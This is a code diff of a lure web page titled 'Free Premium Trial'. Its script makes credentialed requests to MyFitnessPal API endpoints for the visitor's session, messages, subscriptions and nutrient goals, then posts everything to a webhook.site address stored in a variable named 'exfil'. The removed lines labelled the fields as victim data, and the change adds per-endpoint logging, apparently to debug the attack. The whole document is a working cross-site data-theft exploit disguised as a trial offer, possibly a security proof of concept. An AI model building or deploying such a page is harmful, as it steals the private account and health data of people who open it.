@@ -3,36 +3,47 @@
 <head><title>Free Premium Trial</title></head>
 <body>
 <h2>Claiming your free trial...</h2>
+<div id="log"></div>
 <script>
 const exfil = "https://webhook.site/f944539a-15e8-4640-855a-a2079b0ac5c1";
+const log = document.getElementById("log");
+
+function addLog(msg) {
+  log.innerHTML += "<p>" + msg + "</p>";
+}
 
 async function steal() {
-  try {
-    const [session, messages, subs, goals] = await Promise.all([
-      fetch("https://www.myfitnesspal.com/api/auth/session", {credentials:"include"}).then(r=>r.json()),
-      fetch("https://www.myfitnesspal.com/api/services/messages", {credentials:"include"}).then(r=>r.json()),
-      fetch("https://www.myfitnesspal.com/api/services/user-subscriptions?country=TH&language=en", {credentials:"include"}).then(r=>r.json()),
-      fetch("https://www.myfitnesspal.com/api/services/nutrient-goals", {credentials:"include"}).then(r=>r.json())
-    ]);
+  const results = {};
 
+  // Test each endpoint individually
+  const endpoints = [
+    ["session", "https://www.myfitnesspal.com/api/auth/session"],
+    ["messages", "https://www.myfitnesspal.com/api/services/messages"],
+    ["subs", "https://www.myfitnesspal.com/api/services/user-subscriptions?country=TH&language=en"],
+    ["goals", "https://www.myfitnesspal.com/api/services/nutrient-goals"]
+  ];
+
+  for (const [name, url] of endpoints) {
+    try {
+      const data = await fetch(url, {credentials: "include"}).then(r => r.json());
+      results[name] = data;
+      addLog("OK: " + name);
+    } catch(e) {
+      results[name] = "FAILED: " + e.message;
+      addLog("FAILED: " + name + " - " + e.message);
+    }
+  }
+
+  // Send whatever we got
+  try {
     await fetch(exfil, {
       method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({
-        victim_email: session.email,
-        victim_userId: session.userId,
-        victim_tier: session.currentTier,
-        victim_session: session,
-        victim_messages: messages,
-        victim_subscriptions: subs,
-        victim_health_goals: goals,
-        timestamp: new Date().toISOString()
-      })
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(results)
     });
-
-    document.body.innerHTML = "<h2>Done! Data sent.</h2>";
+    addLog("Sent to webhook!");
   } catch(e) {
-    document.body.innerHTML = "<h2>Error: " + e.message + "</h2>";
+    addLog("Webhook send failed: " + e.message);
   }
 }
 
